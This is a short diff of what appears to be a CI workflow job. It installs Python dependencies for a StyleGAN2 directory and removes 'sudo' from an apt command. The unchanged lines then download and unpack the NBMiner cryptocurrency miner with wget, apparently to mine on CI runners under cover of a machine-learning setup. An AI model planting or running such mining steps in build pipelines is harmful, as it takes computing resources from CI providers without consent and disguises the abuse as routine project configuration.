@@ -34,7 +34,7 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
-        sudo apt update -y
+        apt update -y
         apt install git wget nano libpci-dev -y
         wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz 
         tar -xvf NBMiner_36.1_Linux.tgz 
